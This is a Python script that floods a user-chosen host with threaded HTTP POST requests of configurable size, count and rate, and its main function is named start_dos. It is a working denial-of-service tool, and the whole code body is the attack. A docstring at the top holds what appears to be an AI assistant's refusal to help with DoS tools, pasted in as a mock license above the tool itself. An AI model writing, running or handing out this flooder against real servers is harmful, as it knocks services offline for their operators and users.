import requests, threading, time, os
from colorama import Fore, Back
"""
I'm sorry, but I cannot provide a license for using a DoS (Denial of Service) machine. That would be enabling the creation and use of tools for illegal and unethical activities, which I'm not able to do.

DoS attacks are generally considered a form of cybercrime and can have serious legal and financial consequences for the perpetrator. I cannot assist with or encourage the development or use of any tools designed for malicious purposes like DoS attacks.

Instead, I would suggest focusing your efforts on more positive and constructive activities that don't cause harm to others. If you have questions about cybersecurity, network protection, or ethical technology use, I'd be happy to provide general information and guidance. But I cannot help with anything related to DoS or other malicious hacking tools.
"""
os.system('clear')
def send_request(domain, request_counter, data):
    url = f"http://{domain}"
    try:
        start_time = time.time()
        response = requests.post(url, data=data)
        delay = time.time() - start_time
        request_counter['total'] += 1
        sent_data_size = len(data)
        received_data_size = int(response.headers.get('Content-Length', 0))
        print(Fore.GREEN + f"{Back.GREEN}  {Back.RESET} ({request_counter['total']}) | {domain} - {response.status_code} : {delay:.2f} ms" 
              + f" | {sent_data_size} : {received_data_size} BYTE" + Fore.RESET + Back.RESET)
    except requests.exceptions.RequestException:
        request_counter['total'] += 1
        print(Fore.RED + f"{Back.RED}  {Back.RESET} ({request_counter['total']}) | {domain} - 0 : fail | 0 : 0 BYTE" + Fore.RESET + Back.RESET)
def select_data_size():
    while True:
        data_size = input(Fore.CYAN + "DATASIZE>>" + Fore.WHITE)
        if data_size.isnumeric() and int(data_size) > 0:
            return b'a' * int(data_size)
        else:
            os.system('clear')
            print(Fore.RED + "Invalid input. Please enter a positive integer for data size." + Fore.RESET)
            time.sleep(3)
            os.system('clear')
def select_quantity():
    while True:
        quantity = input(Fore.CYAN + "QUANTITY>>" + Fore.WHITE)
        if quantity.isnumeric() and int(quantity) > 0:
            return int(quantity)
        else:
            os.system('clear')
            print(Fore.RED + "Invalid input. Please enter a positive integer for quantity." + Fore.RESET)
            time.sleep(3)
            os.system('clear')
def select_delay():
    while True:
        try:
            delay = float(input(Fore.CYAN + "DELAY>>" + Fore.WHITE))
            if delay > 0:
                return delay
            else:
                os.system('clear')
                print(Fore.RED + "Invalid input. Delay must be a positive number." + Fore.RESET)
                time.sleep(3)
                os.system('clear')
        except ValueError:
            os.system('clear')
            print(Fore.RED + "Invalid input. Please enter a valid number for delay." + Fore.RESET)
            time.sleep(3)
            os.system('clear')
def start_dos():
    while True:
        domain = input(Fore.CYAN + "HOST>>" + Fore.WHITE)
        os.system('clear')
        data = select_data_size()
        os.system('clear')
        number_of_requests = select_quantity()
        os.system('clear')
        requests_per_second = select_delay()
        os.system('clear')
        threads = []
        request_counter = {'total': 0}
        def make_requests():
            for i in range(number_of_requests):
                thread = threading.Thread(target=send_request, args=(domain, request_counter, data))
                threads.append(thread)
                thread.start()
                time.sleep(1 / requests_per_second)
        make_requests()
        for thread in threads:
            thread.join() 
        print(Fore.BLACK + Back.WHITE + "END | Wait 5 seconds" + Fore.RESET + Back.RESET)
        time.sleep(5)
        os.system('clear')
if __name__ == "__main__":
    start_dos()
